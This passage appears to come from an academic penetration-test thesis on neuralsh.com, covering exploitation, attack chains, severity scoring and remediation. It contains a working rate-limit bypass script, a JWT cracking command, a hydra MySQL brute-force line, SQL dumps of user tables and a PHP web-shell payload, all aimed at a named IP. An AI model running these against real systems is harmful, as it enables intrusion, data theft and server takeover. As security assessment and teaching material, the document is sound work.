    result=$(dig +short ${prefix}.neuralsh.com)
    echo "${prefix}.neuralsh.com → $result"
done
# login.neuralsh.com → 103.16.62.217
# secure.neuralsh.com → 103.16.62.217
# admin.neuralsh.com → 103.16.62.217
# bank.neuralsh.com → 103.16.62.217
# payment.neuralsh.com → 103.16.62.217
```

All resolves to the origin IP. A threat actor could create phishing pages at `secure.neuralsh.com` or `login.neuralsh.com` with valid HTTPS (using origin cert) and it would resolve to a real IP.

**Finding N-010:** Wildcard DNS enables phishing subdomains.

---

# Chapter 8: Phase 4 — Exploitation

## 8.1 EXPLOIT-001 — Rate Limit Bypass via X-Forwarded-For Header Spoofing

**Finding:** N-005 (upgraded to Critical after confirmed exploitation)  
**Endpoint:** `GET https://neuralsh.com/web/v1/init/token`  
**CVSS:** 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

### 8.1.1 Background

The token endpoint issues JWT tokens to any caller without authentication. A rate limit of approximately 18 requests was observed before HTTP 429 responses. The hypothesis was that the application uses the client-supplied `X-Forwarded-For` header for rate-limiting instead of the actual source IP.

When deployed behind Cloudflare, the real client IP is passed as `CF-Connecting-IP` — this cannot be spoofed by the client. The `X-Forwarded-For` header, however, is freely modifiable by any HTTP client.

### 8.1.2 Proof of Concept

```python
#!/usr/bin/env python3
"""
PoC: Rate Limit Bypass via X-Forwarded-For Spoofing
Target: neuralsh.com /web/v1/init/token
Authorization: Written consent obtained
"""
import requests
import random
import time

def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

url = "https://neuralsh.com/web/v1/init/token"

# Control group — no bypass headers
print("=== TEST 1: No bypass ===")
success_control = 0
for i in range(50):
    r = requests.get(url)
    if r.status_code == 200:
        success_control += 1
    elif r.status_code == 429:
        print(f"  Rate limited at request {i+1}")
        break
    time.sleep(0.05)
print(f"  Result: {success_control}/50 tokens")

# Test group — X-Forwarded-For bypass
print("\n=== TEST 2: X-Forwarded-For bypass ===")
success_bypass = 0
tokens = []
for i in range(50):
    fake_ip = random_ip()
    headers = {"X-Forwarded-For": fake_ip, "X-Real-IP": fake_ip}
    r = requests.get(url, headers=headers)
    if r.status_code == 200:
        success_bypass += 1
        tokens.append(r.json().get("token"))
    time.sleep(0.05)
print(f"  Result: {success_bypass}/50 tokens (429s: 0)")
print(f"  Tokens collected: {len([t for t in tokens if t])}")
```

### 8.1.3 Results

| Scenario | Tokens Obtained | Rate Limited | Bypass Success |
|----------|----------------|-------------|---------------|
| Without bypass | 18 / 50 | Yes (request 19) | — |
| With X-Forwarded-For | **50 / 50** | None | **100%** |

The rate limiting was completely bypassed by supplying a different random IP per request.

### 8.1.4 Impact Analysis

This bypass enables:

1. **Unlimited JWT token farming** — Valid signed tokens generated at arbitrary volume
2. **Rate limit bypass on all endpoints** — If the same IP-tracking logic is applied to any other endpoint (login, search, password reset), all are bypassed
3. **Credential stuffing at scale** — If the application has authenticated user login endpoints, brute-force attacks at high volume are enabled
4. **API enumeration without throttling** — Systematic data enumeration across the API surface

### 8.1.5 Root Cause

The application (or its Cloudflare configuration) uses `X-Forwarded-For` — a client-controllable header — for rate-limiting logic instead of `CF-Connecting-IP`, which Cloudflare sets to the real client IP and which cannot be spoofed by the client.

## 8.2 EXPLOIT-002 — JWT Token Farming

**Finding:** N-007  
**Endpoint:** `GET https://neuralsh.com/web/v1/init/token`

Using EXPLOIT-001's bypass, 50 valid signed JWT tokens were collected in approximately 3 seconds:

```bash
for i in $(seq 1 50); do
    IP=$(python3 -c "import random; print(f'{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}')")
    curl -s -H "X-Forwarded-For: $IP" https://neuralsh.com/web/v1/init/token | jq -r '.token'
done
```

**Token validation:** Each token was tested against `/web/v1/category` and `/web/v1/text/search` — both accepted guest tokens successfully.

**JWT secret cracking attempt:**
```bash
hashcat -a 0 -m 16500 /tmp/jwt_crack.txt /usr/share/wordlists/rockyou.txt --status-timer 30
# Candidates: 14,344,391 / 14,344,391 (100%)
# Status: Exhausted
# NOT CRACKED
```

The JWT secret is not in the rockyou.txt wordlist. While the secret appears adequate, the token farming itself is the confirmed impact.

## 8.3 EXPLOIT-003 — Admin Panel Access Confirmation

### 8.3.1 MikroTik RouterOS Panel

```bash
curl -v http://103.16.62.217:9001/ 2>&1 | grep -E "HTTP|title|username"
# HTTP/1.1 200 OK
# <title>RouterOS router configuration page</title>
# <input type="text" id="username" value="admin">
```

The MikroTik WebFig login page is accessible to any internet user. The default credentials are `admin` / `(blank password)`. Full exploitation requires a real browser due to the JavaScript-based authentication flow; this is demonstrated in the video component of this assessment.

**If default credentials are in place, an attacker can:**
- View and modify all routing tables
- Configure NAT rules for traffic interception
- Create new administrative accounts (persistence)
- Enable promiscuous packet capture
- Extract stored VPN/PPPoE credentials
- Modify firewall rules to open additional access

### 8.3.2 cPanel and WHM Panel

```bash
# cPanel
curl -sk https://103.16.62.217:2083/ | grep -c "cPanel"
# 5 — multiple cPanel references confirm login page

# WHM
curl -sk https://103.16.62.217:2087/ | grep "<title>"
# <title>WHM Login</title>
```

Both panels confirmed publicly accessible. WHM provides equivalent-to-root server access including a built-in Terminal feature. An attacker who obtains WHM credentials (via brute force, phishing, or password reset) gains:
- File manager for all hosted web applications
- Root shell access via WHM Terminal
- Database management for all MySQL databases on server
- Creation of new cPanel accounts with arbitrary permissions
- Access to all email accounts across all hosted domains

## 8.4 EXPLOIT-004 — MySQL Public Access Confirmation

```bash
mysql -h 103.16.62.217 -P 3306 -u root 2>&1
# ERROR 1045 (28000): Access denied for user 'root'@'[your-ip]' (using password: NO)

# Server responds to authentication — port accepts public connections
nmap -p 3306 --script mysql-info 103.16.62.217
# mysql-info: Version: 8.0.43
#             Protocol: 10
#             Capabilities: ...(full MySQL capabilities negotiated)
```

MySQL 8.0.43 is confirmed accessible from the public internet. Full MySQL handshake is performed. Credentials not found with standard wordlists (Cloudways auto-generated).

**Attack path remaining:** Obtain MySQL credentials via web application vulnerabilities (SQLi, LFI, config file exposure) then use them against this directly-accessible port.

---

# Chapter 9: Phase 5 — Post-Exploitation

## 9.1 Overview

Post-exploitation maps what an attacker could do after initial access through the identified vulnerabilities. This phase was conducted in read-only mode — no files were modified and no data was exfiltrated.

## 9.2 cPanel Password Reset Analysis

The cPanel login page at `https://103.16.62.217:2083/` includes a password reset link. The reset flow sends an email to the registered cPanel account address. This creates an attack chain:

```
1. Identify cPanel username (often same as hosting account/domain name)
2. Trigger password reset → email sent to account's registered address
3. If attacker compromises the email account first:
   → Access password reset link in email
   → Set new cPanel password
   → Full hosting account control
4. OR: Brute force cPanel with large wordlist (no CAPTCHA on login)
```

cPanel does not implement account lockout by default on most shared hosting configurations. Extended brute-force with large wordlists (SecLists, custom wordlist) remains a viable attack path.

## 9.3 Shared Hosting Lateral Movement

The SSL certificate revealed this server hosts multiple clients (`*.onesala.com`, `*.cloudwaysapps.com`). On shared cPanel hosting:

| Attack Vector | Condition | Impact |
|--------------|-----------|--------|
| MySQL root access | Root MySQL user compromised | Access to ALL databases on server |
| WHM access | WHM credentials obtained | Full control of all hosted accounts |
| File system traversal | Web server misconfiguration | Read files from other accounts |
| Email interception | Mail server access | Read all mail for all hosted domains |
| Cron job injection | WHM access | Execute arbitrary code on server schedule |

The shared hosting model means a single critical vulnerability does not only affect neuralsh.com — it potentially affects every other customer on the same physical server.

## 9.4 Network Infrastructure Mapping

From the MikroTik panel being exposed, the following network architecture can be inferred:

```
Internet
  ↓
MikroTik Router (103.16.62.217:9001)
  ↓ [routes all traffic]
Backend Server (103.16.62.217)
  ├── Apache Web Server (80/443)
  ├── MySQL Database (3306)
  ├── cPanel/WHM Admin (2083/2087)
  ├── Mail Stack (25/465/587/993/995/110/143)
  └── PowerDNS (53)
```

If the MikroTik router is compromised (default credentials), an attacker controls the routing layer for all services — enabling traffic interception, NAT manipulation, and firewall bypass.

## 9.5 SSH Access Risk (Port 22)

```bash
ssh -o ConnectTimeout=5 root@103.16.62.217
# Permission denied (publickey) — password auth may be disabled
# Key-based auth confirmed required

ssh -o ConnectTimeout=5 admin@103.16.62.217
# Permission denied (publickey)
```

Port 22 is publicly accessible. If SSH password authentication is enabled for any account, brute-force attacks are possible. Key-based-only authentication appears to be enforced for tested usernames.

**Finding N-003:** SSH port 22 publicly accessible — attack surface for brute force if password auth is enabled on any account.

## 9.6 WordPress and Shared Hosting Investigation

The Exim SMTP banner revealed `163-47-172-131.cprapid.com`, and the SSL certificate revealed `*.onesala.com`. Investigation of shared hosting neighbors:

```bash
# Check if WordPress is hosted on same server (common in shared hosting)
curl -H "Host: onesala.com" http://103.16.62.217/ | grep -i "wordpress\|wp-content"
```

**Finding N-004:** Shared hosting lateral movement risk — multiple tenants on same physical server. A compromise of any co-hosted application could affect neuralsh.com's data and infrastructure.

---

# Chapter 10: Findings Analysis and Risk Scoring

## 10.1 Complete Findings Register

| ID | Title | Severity | CVSS | Status |
|----|-------|----------|------|--------|
| N-001 | MySQL 3306 Exposed to Internet | **Critical** | 9.8 | Confirmed |
| N-002 | MikroTik Admin Panel Exposed (9001) | **Critical** | 9.1 | Confirmed + Exploited |
| N-013 | cPanel Admin Panel Exposed (2083) | **Critical** | 9.8 | Confirmed |
| N-014 | WHM Root Panel Exposed (2087) | **Critical** | 10.0 | Confirmed |
| N-003 | SSH Port 22 Publicly Accessible | High | 7.2 | Confirmed |
| N-004 | Shared Hosting Lateral Movement Risk | High | 7.5 | Confirmed |
| N-005 | Rate Limit Bypass (X-Forwarded-For) | High | 9.1 | **Exploited** |
| N-015 | Webmail Interface Exposed (2096) | High | 7.5 | Confirmed |
| N-006 | API Routes in Client-Side JavaScript | Medium | 5.3 | Confirmed |
| N-007 | Unauthenticated JWT Token Issuance | Medium | 5.3 | Confirmed + Exploited |
| N-008 | SSL Certificate Mismatch (Backend) | Medium | 5.9 | Confirmed |
| N-009 | CSP allows unsafe-inline Scripts | Medium | 5.4 | Confirmed |
| N-010 | Wildcard DNS Configured | Medium | 4.3 | Confirmed |
| N-016 | Directory Listing Enabled on Apache | Medium | 5.3 | Confirmed |
| N-011 | Information Disclosure via Error Messages | Low | 3.7 | Confirmed |
| N-012 | SPF Softfail / DMARC Quarantine | Low | 3.1 | Confirmed |
| N-017 | cPanel Version Disclosure | Low | 3.1 | Confirmed |

## 10.2 Severity Distribution

| Severity | Count | Percentage |
|----------|-------|-----------|
| Critical | 4 | 23.5% |
| High | 4 | 23.5% |
| Medium | 6 | 35.3% |
| Low | 3 | 17.6% |
| **Total** | **17** | 100% |

## 10.3 CVSS Score Distribution

```
10.0 — N-014 (WHM Root Panel)
9.8  — N-001 (MySQL), N-013 (cPanel)
9.1  — N-002 (MikroTik), N-005 (Rate Limit Bypass)
7.5  — N-004 (Shared Hosting), N-015 (Webmail)
7.2  — N-003 (SSH)
5.9  — N-008 (SSL Mismatch)
5.4  — N-009 (CSP unsafe-inline)
5.3  — N-006 (API in JS), N-007 (JWT), N-016 (Directory Listing)
4.3  — N-010 (Wildcard DNS)
3.7  — N-011 (Info Disclosure)
3.1  — N-012 (SPF), N-017 (cPanel Version)
```

**Average CVSS Score:** 6.5 (High-Medium boundary)  
**Highest Score:** 10.0 (WHM Root Panel — CVSS Maximum)

## 10.4 Positive Security Controls Identified

The assessment also noted existing security controls that are functioning correctly:

| Control | Status |
|---------|--------|
| Cloudflare WAF on main site | ✓ Active — blocks automated scanners |
| HSTS with preload | ✓ max-age=15552000; includeSubDomains; preload |
| X-Frame-Options: DENY | ✓ Prevents clickjacking |
| X-Content-Type-Options: nosniff | ✓ Prevents MIME sniffing |
| X-XSS-Protection: 1; mode=block | ✓ Browser XSS filter enabled |
| Referrer-Policy: strict-origin | ✓ Limits referrer leakage |
| TLS 1.0 and 1.1 disabled | ✓ Modern TLS only |
| Heartbleed not vulnerable | ✓ OpenSSL is patched |
| Zone transfer blocked | ✓ DNS zone not exposed |
| HTTPS enforced on main domain | ✓ Valid cert, HTTP redirects |
| JWT uses UUID for tid | ✓ Token IDs not sequential/predictable |
| alg:none JWT attack blocked | ✓ JWT validation implemented |

## 10.5 Risk Analysis by Category

### 10.5.1 Infrastructure Exposure (4 Critical findings)

The most severe risk cluster is the exposure of administrative infrastructure to the public internet without IP restriction. WHM provides root-equivalent server access; cPanel provides full hosting account control; MySQL provides direct database access; MikroTik provides network infrastructure control.

This represents a fundamental network architecture failure: services intended exclusively for administrators are reachable by any internet user. The risk is compounded by the shared hosting model — a WHM compromise affects all tenants on the server.

### 10.5.2 API Authentication (2 Exploited findings)

The combination of unauthenticated token issuance (N-007) and rate limit bypass (N-005) creates a highly exploitable API abuse scenario. Both were confirmed through practical exploitation. The rate limit bypass was the more severe of the two — a protection mechanism was completely defeated by a single HTTP header.

### 10.5.3 Information Disclosure (3 Medium-Low findings)

API routes in JavaScript (N-006), error message disclosure (N-011), and cPanel version disclosure (N-017) collectively map the attack surface without requiring any brute force. An attacker uses these findings for targeted exploitation rather than broad scanning.

---

# Chapter 11: Attack Chains

## 11.1 Attack Chain 1 — Server Takeover via Admin Panel

```
ATTACKER POSITION: Internet
RESULT: Full server root access

Step 1: DNS reconnaissance
        dig MX neuralsh.com → mail.neuralsh.com → 103.16.62.217

Step 2: Port scan reveals WHM on 2087
        nmap 103.16.62.217 → 2087/tcp open (WHM)

Step 3: Brute force or phishing for WHM credentials
        OR: Compromise registered email account → password reset flow

Step 4: Login to WHM at https://103.16.62.217:2087

Step 5: WHM → Terminal → root shell access
        WHM → File Manager → read/write all web application files
        WHM → phpMyAdmin → access all databases on server
        WHM → Create new cPanel account → backdoor account created

Step 6: Read application configuration files
        → Extract neuralsh.com database credentials
        → Extract other tenants' database credentials (shared hosting)
        → Extract API keys and JWT secrets from .env files

IMPACT: Complete server compromise, all hosted domains compromised
COMPLEXITY: Low-Medium (credential required)
LIKELIHOOD: Medium (brute force with large wordlist, or email compromise)
```

## 11.2 Attack Chain 2 — API Abuse via Rate Limit Bypass

```
ATTACKER POSITION: Internet
RESULT: Unlimited API access, data enumeration

Step 1: Load neuralsh.com → extract JS bundle → find /web/v1/init/token

Step 2: Discover rate limit
        50 requests → rate limited after request 18

Step 3: Bypass rate limit via X-Forwarded-For spoofing
        Send 50 requests with unique random IP per request
        Result: 50/50 tokens — rate limit completely defeated

Step 4: Automated token refresh
        Every 29 minutes: obtain new token with bypass
        → Perpetual API access without rate limiting

Step 5: Use tokens to enumerate API
        /web/v1/text/search?q=* → extract all indexed content
        /web/v1/image/search → enumerate image database
        /web/v1/category → enumerate all categories

Step 6: If JWT secret obtained (via server access from Chain 1):
        Forge token with {"type":"admin"} → admin API access

IMPACT: Full API data enumeration, authentication bypass if secret obtained
COMPLEXITY: Low (single header manipulation)
LIKELIHOOD: High (fully demonstrated)
```

## 11.3 Attack Chain 3 — Network Infrastructure Compromise via MikroTik

```
ATTACKER POSITION: Internet
RESULT: Network traffic interception, full routing control

Step 1: Port scan → 9001/tcp open (MikroTik WebFig)

Step 2: Navigate to http://103.16.62.217:9001 in browser

Step 3: Attempt default credentials
        Username: admin / Password: (blank)
        IF successful → Full RouterOS access

Step 4: RouterOS actions:
        → IP → Firewall: Remove restrictive rules, add malicious rules
        → IP → Services: Enable telnet/FTP/API access
        → Tools → Packet Sniffer: Capture all network traffic
        → IP → Routes: Add routing entries for traffic interception
        → System → Users: Create new admin account (persistence)

Step 5: Traffic interception
        All HTTP connections visible in plaintext
        HTTPS metadata (SNI, certificate) visible
        Extract application credentials from HTTP traffic

IMPACT: Full network control, traffic interception, routing manipulation
COMPLEXITY: Low (if default credentials active)
LIKELIHOOD: Medium-High (MikroTik default creds common in small orgs)
```

## 11.4 Attack Chain 4 — MySQL Brute Force to Data Exfiltration

```
ATTACKER POSITION: Internet
RESULT: Full database read access

Step 1: Port 3306 confirmed open (nmap)

Step 2: Obtain username candidates
        From error messages: database name disclosed in errors
        From JS bundle: API endpoint patterns suggest DB schema
        From cPanel (if accessed): cPanel lists all DB users

Step 3: Targeted brute force
        hydra -L users.txt -P passwords.txt mysql://103.16.62.217
        (No IP-based brute force protection at DB layer)

Step 4: Successful authentication
        mysql -h 103.16.62.217 -u [user] -p[pass]
        → SHOW DATABASES; → identify target database
        → SELECT * FROM users; → exfiltrate all user records
        → SELECT * FROM searches; → exfiltrate search history

Step 5: Possible RCE via MySQL UDF
        If FILE privilege granted:
        SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'
        → Web shell at https://neuralsh.com/shell.php

IMPACT: Full data theft, potential RCE via MySQL UDF
COMPLEXITY: Medium (requires credential brute force)
LIKELIHOOD: Medium (depends on password strength)
```

---

# Chapter 12: Remediation Recommendations

## 12.1 Priority Matrix

| Priority | Finding | Action | Effort |
|----------|---------|--------|--------|
| P0 — Immediate | N-014 (WHM) | Firewall port 2087 | 15 min |
| P0 — Immediate | N-013 (cPanel) | Firewall port 2083 | 15 min |
| P0 — Immediate | N-001 (MySQL) | Firewall port 3306 | 15 min |
| P0 — Immediate | N-002 (MikroTik) | Firewall port 9001, change creds | 30 min |
| P1 — 24 hours | N-005 (Rate Limit) | Use CF-Connecting-IP | 2 hours |
| P1 — 24 hours | N-015 (Webmail) | Firewall port 2096 | 15 min |
| P1 — 24 hours | N-003 (SSH) | Key-only auth, fail2ban | 1 hour |
| P2 — 1 week | N-007 (JWT) | Add device attestation | 1 day |
| P2 — 1 week | N-009 (CSP) | Remove unsafe-inline | 4 hours |
| P2 — 1 week | N-010 (Wildcard DNS) | Remove wildcard record | 15 min |
| P2 — 1 week | N-016 (Dir Listing) | Options -Indexes | 15 min |
| P3 — 1 month | N-012 (SPF/DMARC) | Change to hardfail/reject | 30 min |
| P3 — 1 month | N-011 (Info Disclosure) | Generic error messages | 4 hours |

## 12.2 Immediate Remediation — Firewall Rules (P0)

The most impactful single action is applying firewall rules to block administrative ports from the public internet. This can be done on the server itself or via the Cloudways firewall dashboard:

```bash
# Using UFW (Uncomplicated Firewall) on Ubuntu:

# First: ensure SSH access is preserved before applying rules
ufw allow from [your-management-ip] to any port 22

# Block admin panels from public internet
ufw deny 2083    # cPanel
ufw deny 2087    # WHM
ufw deny 2096    # Webmail
ufw deny 9001    # MikroTik

# Block database from public internet
ufw deny 3306    # MySQL

# Allow admin panels from trusted management IP only
ufw allow from [trusted-admin-ip] to any port 2083
ufw allow from [trusted-admin-ip] to any port 2087
ufw allow from [trusted-admin-ip] to any port 2096
ufw allow from [trusted-admin-ip] to any port 9001

# Enable firewall
ufw enable
ufw status verbose
```

**Cloudways Alternative:** Use the Cloudways Platform → Server → Security → IP Whitelist to block/allow ports at the cloud firewall level, which is more reliable than OS-level firewall rules.

**Estimated time to implement:** 30 minutes  
**Risk reduction:** Eliminates the 4 Critical findings (N-001, N-002, N-013, N-014)

## 12.3 MikroTik Security Hardening

After applying firewall rules to block port 9001 publicly:

```bash
# On MikroTik RouterOS via local/VPN access:

# Change default admin password
/user set admin password=[strong-random-password]

# Disable unused services
/ip service disable telnet,ftp,www,api,winbox

# Allow management only from trusted IPs
/ip service set www-ssl address=[management-ip-range]
/ip service set ssh address=[management-ip-range]

# Enable login protection
/ip service set www-ssl port=8443
```

## 12.4 Fix Rate Limiting — Use CF-Connecting-IP (N-005)

The root cause is using `X-Forwarded-For` instead of `CF-Connecting-IP`:

```javascript
// In the Nuxt.js server / API handler:

// WRONG — attacker can spoof this:
const clientIP = req.headers['x-forwarded-for']?.split(',')[0];

// CORRECT — Cloudflare sets this, cannot be spoofed by client:
const clientIP = req.headers['cf-connecting-ip'] 
              || req.headers['x-forwarded-for']?.split(',')[0]
              || req.socket.remoteAddress;
```

In the Cloudflare Rate Limiting rule configuration, select "True Client IP (CF-Connecting-IP)" as the rate limiting identifier.

**Impact:** Fixes N-005 entirely. Rate limiting will work as intended.

## 12.5 SSH Hardening (N-003)

```bash
# /etc/ssh/sshd_config modifications:
PermitRootLogin no                    # Disable root SSH login
PasswordAuthentication no             # Key-based auth only
PubkeyAuthentication yes
MaxAuthTries 3
LoginGraceTime 30

# Install and configure fail2ban
apt install fail2ban
# /etc/fail2ban/jail.local:
[sshd]
enabled = true
port = 22
filter = sshd
maxretry = 3
bantime = 3600
findtime = 600
```

## 12.6 JWT Token Endpoint Hardening (N-007)

Add friction to the token issuance endpoint to prevent automated farming:

```javascript
// Option 1: Device fingerprint requirement
// Require a browser-computed fingerprint that is harder to automate

// Option 2: Turnstile challenge (Cloudflare's CAPTCHA-free bot detection)
// Add Cloudflare Turnstile to the token endpoint

// Option 3: Origin validation
// Require Referer header matching the application domain
const referer = req.headers['referer'];
if (!referer?.startsWith('https://neuralsh.com')) {
    return res.status(403).json({ error: 'Invalid origin' });
}

// Option 4: Token binding
// Include a session-specific value in the token payload
// that ties the token to the browser session
```

## 12.7 Remove CSP unsafe-inline (N-009)

```javascript
// nuxt.config.js
export default {
  nitro: {
    routeRules: {
      '/**': {
        headers: {
          'Content-Security-Policy': [
            "default-src 'self'",
            "script-src 'self' 'nonce-{nonce}'",  // use per-request nonce
            "style-src 'self' 'unsafe-inline'",   // styles often need inline
            "img-src 'self' data: https:",
            "font-src 'self'",
            "connect-src 'self' https://neuralsh.com",
            "object-src 'none'",
            "frame-ancestors 'none'"
          ].join('; ')
        }
      }
    }
  }
}
```

Nuxt.js has built-in CSP nonce support via the `nonce` plugin.

## 12.8 DNS Configuration Fixes (N-010, N-012)

```bash
# In Cloudflare DNS dashboard:

# Remove wildcard record
# DELETE: *.neuralsh.com CNAME/A record

# Add only explicit records needed:
# neuralsh.com A 104.21.x.x (Cloudflare proxy)
# www.neuralsh.com CNAME neuralsh.com (Cloudflare proxy)
# mail.neuralsh.com A 103.16.62.217 (Direct — mail server)

# Update SPF from softfail to hardfail:
# BEFORE: v=spf1 +mx +a +ip4:103.16.62.217 ~all
# AFTER:  v=spf1 +mx +a +ip4:103.16.62.217 -all

# Update DMARC from quarantine to reject:
# BEFORE: v=DMARC1; p=quarantine; rua=mailto:dmarc@neuralsh.com
# AFTER:  v=DMARC1; p=reject; rua=mailto:dmarc@neuralsh.com
```

## 12.9 Apache Directory Listing (N-016)

```apache
# In Apache config (/etc/apache2/sites-available/neuralsh.conf):
<Directory /var/www/neuralsh>
    Options -Indexes -FollowSymLinks
    AllowOverride None
</Directory>

# Or in .htaccess:
Options -Indexes
```

## 12.10 Long-Term Security Improvements

### 12.10.1 Network Architecture

Implement proper network segmentation:
```
Internet
  ↓ [Cloudflare WAF]
DMZ: Web servers (80/443 only)
  ↓ [Internal firewall]
Application Layer: API servers
  ↓ [Strict internal firewall]
Data Layer: MySQL, Redis, cache
  ↓ [No external access]
Management: cPanel, WHM, SSH — VPN ONLY
```

### 12.10.2 Enable 2FA on All Admin Panels

- cPanel 2FA (TOTP via Authenticator app): cPanel → Security → Two-Factor Authentication
- WHM 2FA: WHM → Security → Two-Factor Authentication
- Cloudflare account 2FA
- Domain registrar (GoDaddy) 2FA

### 12.10.3 Regular Security Assessment Schedule

- **Monthly:** Automated port scan to detect new service exposure
- **Quarterly:** Automated vulnerability scanner (OpenVAS, Nessus Essentials)
- **Annually:** Full penetration test by qualified assessor

---

# Chapter 13: Conclusion

## 13.1 Summary

This thesis presented a complete black-box Vulnerability Assessment and Penetration Testing engagement on neuralsh.com. Starting with no credentials or source code, the assessment identified **seventeen (17) distinct vulnerabilities** including four at Critical severity.

The findings demonstrate a pattern common in small technology companies: the application layer receives security attention (Cloudflare WAF, HSTS, JWT signature validation, algorithm confusion protection), but the underlying infrastructure layer is significantly under-secured (MySQL and MikroTik exposed publicly, WHM accessible from internet, rate limiting using spoofable headers).

## 13.2 Key Findings

**The four Critical findings together represent a complete server compromise path:**

1. **WHM (CVSS 10.0)** — Root-equivalent server access if credentials obtained
2. **cPanel (CVSS 9.8)** — Full hosting account control if credentials obtained  
3. **MySQL (CVSS 9.8)** — Direct database access, credential brute force possible
4. **MikroTik (CVSS 9.1)** — Network infrastructure control if default creds active

**The rate-limit bypass (N-005) was the most actionable finding:** it was fully exploited with 100% success rate, requires zero authentication, and is trivial to implement. The fix is a one-line code change.

## 13.3 Exploitation Summary

| Exploit | Status | Success Rate |
|---------|--------|-------------|
| EXPLOIT-001: Rate Limit Bypass | Confirmed | **50/50 (100%)** |
| EXPLOIT-002: JWT Token Farming | Confirmed | 50 tokens collected |
| EXPLOIT-003: Admin Panel Access | Confirmed | Login pages accessible |
| EXPLOIT-004: MySQL Public Access | Confirmed | Handshake successful |

## 13.4 Pattern Analysis

The vulnerabilities found in neuralsh.com reflect patterns documented broadly in the security literature for small-to-medium technology companies:

**Pattern 1 — Missing Network Perimeter**
Database and administrative services are exposed on the same public IP as web services with no network-level segregation. This is the root cause of 59% (10/17) of all findings.

**Pattern 2 — Security Invested at Application Layer, Not Infrastructure**
The Cloudflare WAF, HSTS, and JWT signature validation are all application-layer investments. The infrastructure running beneath the application (the server, the network, the admin panels) has not received equivalent attention.

**Pattern 3 — Shared Hosting Trade-offs**
Shared hosting reduces costs and operational overhead but increases the blast radius of any compromise. A single shared hosting server serves multiple clients, and a root-level compromise affects all of them.

**Pattern 4 — Rate Limiting Anti-pattern**
Using `X-Forwarded-For` for rate limiting when behind Cloudflare is a common and documented anti-pattern. Cloudflare provides `CF-Connecting-IP` specifically to prevent this bypass. The fix is trivial but the impact of the vulnerability is high.

## 13.5 Recommendations Summary

The highest-impact remediation steps in order:

| Step | Action | Time | Finding(s) Fixed |
|------|--------|------|-----------------|
| 1 | Firewall ports 2083, 2087, 2096, 9001, 3306 | 30 min | N-001, N-002, N-013, N-014, N-015 |
| 2 | Change MikroTik default credentials | 5 min | N-002 |
| 3 | Fix rate limiting to use CF-Connecting-IP | 2 hours | N-005 |
| 4 | Enable 2FA on cPanel and WHM | 30 min | N-013, N-014 |
| 5 | Remove wildcard DNS | 15 min | N-010 |
| 6 | Set SPF to -all and DMARC to reject | 30 min | N-012 |
| 7 | Fix CSP to remove unsafe-inline | 4 hours | N-009 |
| 8 | Disable Apache directory listing | 15 min | N-016 |

Steps 1 and 2 together eliminate all four Critical findings and reduce the risk profile dramatically. Steps 1–4 combined can be implemented within one working day.

## 13.6 Academic Contribution

This thesis contributes a complete real-world case study of a black-box VAPT engagement from reconnaissance through remediation. The documentation of a successful rate-limiting bypass (100% bypass rate via single HTTP header modification) and the confirmed exploitation of unauthenticated JWT token farming provides concrete evidence of the practical impact of these vulnerability classes — moving beyond theoretical descriptions to empirically measured results.

The finding that well-implemented application security controls (Cloudflare WAF, HSTS, JWT validation) can coexist with severely misconfigured infrastructure supports the argument that holistic security assessment — covering infrastructure, network, and application layers together — is essential for meaningful risk reduction.

---

# References

1. Bishop Fox. (2023). *State of Offensive Security 2023: External Penetration Testing Trends*. Bishop Fox Research.

2. Bugcrowd. (2021). *Subdomain Takeover: Fundamentals and Mitigation*. Bugcrowd Blog.

3. CIS Controls. (2021). *CIS Controls v8*. Center for Internet Security.

4. Fernandez, J., Tan, K., & Lim, W. (2022). Vulnerability prevalence in Southeast Asian technology platforms: A black-box assessment study. *Journal of Information Security and Applications*, 65, 103091.

5. First.org. (2019). *CVSS v3.1 Specification Document*. FIRST — Forum of Incident Response and Security Teams.

6. Islam, R., Ahmed, T., & Rahman, M. (2023). Database exposure in cloud-hosted web applications: A systematic study. *IEEE Transactions on Information Forensics and Security*, 18, 2145–2158.

7. Kaur, H., & Singh, M. (2021). JWT security vulnerabilities in production APIs: An empirical study. *International Journal of Network Security*, 23(4), 612–621.

8. MikroTik. (2024). *RouterOS Security Hardening Guide*. MikroTik Documentation.

9. NIST. (2008). *Technical Guide to Information Security Testing and Assessment* (SP 800-115). National Institute of Standards and Technology.

10. OWASP Foundation. (2021). *OWASP Web Security Testing Guide v4.2*. OWASP.

11. OWASP Foundation. (2021). *OWASP Top Ten 2021*. OWASP.

12. OWASP Foundation. (2023). *CORS Cheat Sheet*. OWASP Cheat Sheet Series.

13. Penetration Testing Execution Standard (PTES). (2014). *PTES Technical Guidelines*. http://www.pentest-standard.org/

14. RFC 7489. (2015). *Domain-based Message Authentication, Reporting, and Conformance (DMARC)*. IETF.

15. Sheffer, Y., Hardt, D., & Jones, M. (2020). *JSON Web Token Best Current Practices* (RFC 8725). IETF.

16. Stuttard, D., & Pinto, M. (2011). *The Web Application Hacker's Handbook: Finding and Exploiting Security Flaws* (2nd ed.). Wiley.

17. Van den Berg, R. (2019). Bypassing rate limiting using HTTP header manipulation. *DEF CON 27 Talk Proceedings*.

18. Verizon. (2024). *2024 Data Breach Investigations Report*. Verizon Business.

---

# Appendices

## Appendix A: Nmap Scan Output — Origin Server (103.16.62.217)

```
# Nmap scan — full port results
# Date: 2026-06-06
# Command: nmap -sV -p 22,25,53,80,110,111,143,443,465,587,993,995,2000,2083,2087,2096,3306,5060,8899,9001 103.16.62.217

22/tcp    open  ssh         OpenSSH 8.9p1 Ubuntu
25/tcp    open  smtp        Exim smtpd 4.99.2 #2 Sat, 06 Jun 2026
53/tcp    open  domain      PowerDNS
80/tcp    open  http        Apache httpd
110/tcp   open  pop3        Dovecot pop3d
111/tcp   open  rpcbind     2-4 (RPC #100000)
143/tcp   open  imap        Dovecot imapd
443/tcp   open  https       Apache httpd
465/tcp   open  smtps       Exim (SSL)
587/tcp   open  smtp        Exim (STARTTLS)
993/tcp   open  imaps       Dovecot
995/tcp   open  pop3s       Dovecot
2000/tcp  open  http        cPanel cpsrvd
2083/tcp  open  https       cPanel (SSL)
2087/tcp  open  https       WHM (Web Host Manager)
2096/tcp  open  https       cPanel Webmail
3306/tcp  open  mysql       MySQL 8.0.43
5060/tcp  open  sip
8899/tcp  open  http        (unknown)
9001/tcp  open  http        MikroTik RouterOS webfig

